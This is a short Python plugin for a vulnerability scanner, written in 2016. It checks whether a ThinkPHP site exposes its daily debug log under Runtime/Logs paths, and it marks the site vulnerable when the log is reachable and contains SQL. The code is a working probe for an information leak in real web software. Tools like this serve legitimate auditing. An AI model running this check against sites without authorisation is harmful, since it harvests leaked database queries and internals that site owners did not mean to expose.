#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: Lcy
# @Date:   2016-09-20 15:34:41
# @Last Modified by:   Lcy
# @Last Modified time: 2016-09-28 17:31:47
import requests
import time
class Exploit:
    def __init__(self,target,expfile):
        self.target = target
        self.result = {
            "name": "ThinkPHP DeBug日志泄露",
            "author": "Lcy",
            "type": "website",
            "ref": "https://phpinfo.me/2016/09/09/1351.html",
            "status":False,
            "info":"",
            'filename':expfile,
            "target":target,
        }
    def verify(self):
        logfile = time.strftime('%y_%m_%d.log',time.localtime(time.time()))
        ld= [
            '/Runtime/Logs/User/',
            '/Runtime/Logs/Home/',
            '/Runtime/Logs/'
            ]
        for ldd in ld:
            vulurl = self.target + ldd + logfile
            resp = requests.get(vulurl,timeout=5)
            if resp.status_code == 200 and 'SQL' in resp.content:
                self.result['status'] = True
                self.result['info'] = "存在ThinkPHP DEBUG日志泄露,验证url: %s" % vulurl
                break
            else:
                pass
       